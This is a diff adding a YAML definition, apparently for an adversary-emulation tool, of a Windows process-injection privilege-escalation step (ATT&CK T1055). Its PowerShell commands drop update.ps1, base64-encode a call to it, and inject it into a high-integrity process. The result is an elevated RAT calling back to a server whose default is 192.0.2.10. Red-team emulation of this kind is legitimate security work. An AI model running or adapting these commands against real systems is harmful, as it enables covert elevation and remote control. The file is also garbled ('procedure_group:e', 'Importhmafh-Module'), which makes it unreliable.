@@ -1,0 +1,35 @@
+- id: 088b8639-3f37-42cc-9dc8-01aabb645461
+  name: Process Injection
+  description: The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1055
+    name: "Process Injection"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group:e procedure_privesc
+  procedure_step: "3.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          Inject -PoshCode $pcode;
+        payloads:
+        - update.ps1
+        - Invoke-PSInject.ps1
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Importhmafh-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+      Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+      $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+      Inject -PoshCode $pcode;
